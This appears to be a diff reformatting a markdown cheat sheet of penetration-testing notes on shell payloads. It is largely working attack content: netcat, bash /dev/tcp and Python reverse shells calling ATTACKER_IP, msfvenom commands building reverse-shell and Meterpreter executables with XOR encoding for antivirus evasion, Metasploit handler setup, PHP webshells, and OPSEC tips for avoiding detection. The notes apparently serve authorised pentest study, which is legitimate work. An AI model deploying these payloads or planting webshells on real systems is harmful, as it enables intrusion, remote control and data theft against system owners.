@@ -1,26 +1,40 @@
-Shell Payload Generation & Delivery – Pentest Notes
-Concept
+
+
+---
+
+# Shell Payload Generation & Delivery – Pentest Notes
+
+---
+
+# Concept
 
 Getting RCE is useless unless you can turn it into a shell.
 
-A payload is executable code that creates a shell automatically.
+A **payload** is executable code that creates a shell automatically.
 
 Instead of manually typing:
 
+```bash
 nc ATTACKER_IP 4444 -e /bin/bash
+```
 
 you generate a payload that does it for you.
 
 Used for:
 
-File Uploads
-RCE
-Phishing
-Macro attacks
-Exploits
-Scheduled Tasks
-Service exploits
-Payload Flow
+* File Uploads
+* RCE
+* Phishing
+* Macro attacks
+* Exploits
+* Scheduled Tasks
+* Service exploits
+
+---
+
+# Payload Flow
+
+```
 Gain Code Execution
         │
         ▼
@@ -40,61 +54,103 @@ Stabilise Shell
         │
         ▼
 Privilege Escalation
-Payload Types
-Reverse Shell
+```
+
+---
+
+# Payload Types
+
+## Reverse Shell
 
 Target connects back.
 
+```
 Victim  ─────────► Attacker
+```
 
 Most common.
 
 Use when:
 
-Firewall blocks inbound
-Target has internet access
-NAT exists
-Bind Shell
+* Firewall blocks inbound
+* Target has internet access
+* NAT exists
+
+---
+
+## Bind Shell
 
 Victim waits.
 
+```
 Attacker ─────────► Victim
+```
 
 Use when:
 
-Outbound blocked
-Inbound allowed
+* Outbound blocked
+* Inbound allowed
 
 Less common.
 
-Manual Payloads
+---
+
+# Manual Payloads
 
 Useful when:
 
-msfvenom unavailable
-AV blocks binaries
-Need one-liners
-Netcat Reverse
+* msfvenom unavailable
+* AV blocks binaries
+* Need one-liners
+
+---
+
+## Netcat Reverse
+
+```bash
 nc ATTACKER_IP 4444 -e /bin/bash
-Netcat Reverse (No -e)
+```
+
+---
+
+## Netcat Reverse (No -e)
+
+```bash
 mkfifo /tmp/f
 nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1
 rm /tmp/f
+```
 
 Works on OpenBSD Netcat.
 
-Netcat Bind
+---
+
+## Netcat Bind
+
+```bash
 mkfifo /tmp/f
 nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1
 rm /tmp/f
-Bash Reverse Shell
+```
+
+---
+
+## Bash Reverse Shell
+
+```bash
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
 
 Requirements
 
-Bash
-/dev/tcp enabled
-Python Reverse Shell
+* Bash
+* /dev/tcp enabled
+
+---
+
+## Python Reverse Shell
+
+```bash
 python3 -c '
 import socket,os,pty
 s=socket.socket()
@@ -104,27 +160,38 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 '
+```
 
 One of the best Linux payloads.
 
-PowerShell Reverse Shell
+---
+
+## PowerShell Reverse Shell
 
 Large one-liner using .NET TCPClient.
 
 Use when:
 
-Windows
-PowerShell installed
-No uploads possible
-Choosing Payloads
-Target	Best Choice
-Linux	Bash / Python
-Windows	PowerShell
-Netcat Installed	Netcat
-No Netcat	Python / Bash
-File Upload	msfvenom
-Web App	Webshell
-Payload Resources
+* Windows
+* PowerShell installed
+* No uploads possible
+
+---
+
+# Choosing Payloads
+
+| Target           | Best Choice   |
+| ---------------- | ------------- |
+| Linux            | Bash / Python |
+| Windows          | PowerShell    |
+| Netcat Installed | Netcat        |
+| No Netcat        | Python / Bash |
+| File Upload      | msfvenom      |
+| Web App          | Webshell      |
+
+---
+
+# Payload Resources
 
 Bookmark:
 
@@ -132,21 +199,23 @@ PayloadsAllTheThings
 
 Contains payloads for:
 
-Bash
-Python
-PHP
-Perl
-Ruby
-Java
-PowerShell
-NodeJS
-Lua
-ASP
-JSP
+* Bash
+* Python
+* PHP
+* Perl
+* Ruby
+* Java
+* PowerShell
+* NodeJS
+* Lua
+* ASP
+* JSP
 
 Excellent during engagements.
 
-msfvenom
+---
+
+# msfvenom
 
 Purpose:
 
@@ -154,100 +223,138 @@ Generate payloads.
 
 Supports:
 
-Windows
-Linux
-macOS
-Android
-PHP
-JSP
-ASPX
-WAR
-Python
-PowerShell
-Basic Syntax
+* Windows
+* Linux
+* macOS
+* Android
+* PHP
+* JSP
+* ASPX
+* WAR
+* Python
+* PowerShell
+
+---
+
+## Basic Syntax
+
+```bash
 msfvenom \
 -p PAYLOAD \
 LHOST=IP \
 LPORT=PORT \
 -f FORMAT \
 -o OUTPUT
+```
+
+---
 
 Example
 
+```bash
 msfvenom \
 -p windows/x64/shell/reverse_tcp \
 LHOST=10.10.14.15 \
 LPORT=4444 \
 -f exe \
 -o shell.exe
+```
 
 Creates:
 
+```
 shell.exe
-Important Flags
-Flag	Meaning
--p	Payload
--f	Output format
--o	Output filename
-LHOST	Callback IP
-LPORT	Callback Port
--e	Encoder
--i	Encoder iterations
-Output Formats
+```
+
+---
+
+# Important Flags
+
+| Flag  | Meaning            |
+| ----- | ------------------ |
+| -p    | Payload            |
+| -f    | Output format      |
+| -o    | Output filename    |
+| LHOST | Callback IP        |
+| LPORT | Callback Port      |
+| -e    | Encoder            |
+| -i    | Encoder iterations |
+
+---
+
+# Output Formats
 
 Windows
 
+```
 exe
 dll
 powershell
+```
 
 Linux
 
+```
 elf
 python
+```
 
 Web
 
+```
 php
 jsp
 war
 aspx
-Stageless Payloads
+```
+
+---
+
+# Stageless Payloads
 
 Everything included inside payload.
 
+```
 Victim
    │
    ▼
 Connects
+```
 
 Advantages
 
-Works with Netcat
-Simpler
-Reliable
+* Works with Netcat
+* Simpler
+* Reliable
 
 Disadvantages
 
-Larger
-Easier AV detection
+* Larger
+* Easier AV detection
 
 Example
 
+```bash
 linux/x64/shell_reverse_tcp
+```
 
 Notice:
 
+```
 shell_reverse_tcp
+```
 
 Underscore.
 
-Staged Payloads
+---
+
+# Staged Payloads
 
 Tiny payload first.
 
 Downloads second stage.
 
+```
 Victim
    │
    ▼
@@ -258,92 +365,127 @@ Downloads Payload
    │
    ▼
 Gets Shell
+```
 
 Advantages
 
-Smaller initial file
-Better AV evasion
-Meterpreter support
+* Smaller initial file
+* Better AV evasion
+* Meterpreter support
 
 Disadvantages
 
-Requires multi/handler
+* Requires multi/handler
 
 Example
 
+```
 windows/x64/shell/reverse_tcp
+```
 
 Notice:
 
+```
 shell/reverse_tcp
+```
 
 Forward slash.
 
 Easy way to remember:
 
+```
 underscore = stageless
 
 slash = staged
-Meterpreter
+```
+
+---
+
+# Meterpreter
 
 Advanced Metasploit shell.
 
 Features
 
-File upload/download
-Webcam
-Keylogging
-Process migration
-Token stealing
-Privilege escalation
-Pivoting
-Screenshots
-Hash dumping
+* File upload/download
+* Webcam
+* Keylogging
+* Process migration
+* Token stealing
+* Privilege escalation
+* Pivoting
+* Screenshots
+* Hash dumping
 
 Requires:
 
+```
 multi/handler
+```
+
+---
 
 Generate Meterpreter
 
+```bash
 msfvenom \
 -p windows/x64/meterpreter/reverse_tcp \
 LHOST=IP \
 LPORT=4444 \
 -f exe \
 -o meterpreter.exe
-List Payloads
+```
+
+---
+
+# List Payloads
+
+```bash
 msfvenom --list payloads
+```
 
 Search
 
+```bash
 msfvenom --list payloads | grep meterpreter
-Encoding
+```
+
+---
+
+# Encoding
 
 Used for basic AV evasion.
 
 Example
 
+```bash
 msfvenom \
 -p windows/x64/shell_reverse_tcp \
 -e x64/xor \
 -i 3 \
 -f exe \
 -o encoded.exe
+```
 
 Flags
 
+```
 -e
+```
 
 Encoder.
 
+```
 -i
+```
 
 Number of encoding passes.
 
 Modern EDR often detects behavior anyway.
 
-multi/handler
+---
+
+# multi/handler
 
 Purpose:
 
@@ -351,49 +493,80 @@ Catch staged payloads.
 
 Supports
 
-Meterpreter
-Staged Payloads
-Multiple sessions
-Session management
-Start
+* Meterpreter
+* Staged Payloads
+* Multiple sessions
+* Session management
+
+---
+
+## Start
+
+```bash
 sudo msfconsole
+```
+
+---
 
 Load
 
+```bash
 use multi/handler
+```
+
+---
 
 Configure
 
+```bash
 set PAYLOAD windows/x64/shell/reverse_tcp
 
 set LHOST 10.10.14.15
 
 set LPORT 4444
+```
+
+---
 
 Start Listener
 
+```bash
 exploit -j
+```
 
 Background job starts.
+
+---
 
 Sessions
 
 List
 
+```bash
 sessions
+```
 
 Interact
 
+```bash
 sessions -i 1
+```
 
 Background session
 
+```
 background
+```
 
 or
 
+```
 Ctrl+Z
-Handler vs Netcat
+```
+
+---
+
+# Handler vs Netcat
 
 Use Netcat
 
@@ -402,6 +575,8 @@ Use Netcat
 ✔ Stageless payloads
 
 ✔ Simple reverse shells
+
+---
 
 Use multi/handler
 
@@ -415,7 +590,9 @@ Use multi/handler
 
 ✔ Post-exploitation
 
-Webshells
+---
+
+# Webshells
 
 Runs commands through HTTP.
 
@@ -423,88 +600,129 @@ Looks like normal web traffic.
 
 Useful when:
 
-File upload vulnerability
-Only HTTP allowed
-Reverse shell blocked
-Basic PHP Webshell
+* File upload vulnerability
+* Only HTTP allowed
+* Reverse shell blocked
+
+---
+
+## Basic PHP Webshell
+
+```php
 <?php echo shell_exec($_GET["cmd"]); ?>
+```
 
 Usage
 
+```
 shell.php?cmd=whoami
+```
+
+---
 
 POST Version
 
+```php
 <?php
 echo shell_exec($_POST["cmd"]);
 ?>
+```
 
 Keeps commands out of URL history.
 
+---
+
 Password Protected
 
+```php
 if($_POST['auth']=="password"){
     echo shell_exec($_POST['cmd']);
 }
+```
+
+---
 
 Other Webshell Types
 
 Windows IIS
 
+```
 ASPX
+```
 
 Java
 
+```
 JSP
+```
 
 PHP
 
+```
 PHP
-Upgrade Webshell
+```
+
+---
+
+# Upgrade Webshell
 
 Instead of
 
+```
 whoami
+```
 
 Execute
 
-Bash Reverse Shell
-Python Reverse Shell
-PowerShell Reverse Shell
+* Bash Reverse Shell
+* Python Reverse Shell
+* PowerShell Reverse Shell
 
 to obtain an interactive shell.
 
-PentestMonkey
+---
+
+# PentestMonkey
 
 Location
 
+```bash
 /usr/share/webshells/php/
+```
 
 Contains
 
+```
 php-reverse-shell.php
+```
 
 Popular PHP reverse shell.
 
-OPSEC
+---
+
+# OPSEC
 
 Avoid
 
-Repeated requests
-Suspicious filenames
-GET parameters
-Noisy commands
+* Repeated requests
+* Suspicious filenames
+* GET parameters
+* Noisy commands
 
 Prefer
 
-POST
-HTTPS
-Realistic filenames
-Slow command execution
+* POST
+* HTTPS
+* Realistic filenames
+* Slow command execution
 
 Always remove webshells after the engagement.
 
-Payload Decision Tree
+---
+
+# Payload Decision Tree
+
+```
 RCE?
  │
  ▼
@@ -528,7 +746,13 @@ Can execute commands?
         └── Windows
                ├ PowerShell
                └ msfvenom
-Engagement Workflow (Memorize)
+```
+
+---
+
+# Engagement Workflow (Memorize)
+
+```
 Gain RCE
       │
       ▼
@@ -552,3 +776,5 @@ Stabilise shell
       │
       ▼
 Privilege Escalation
+```
+
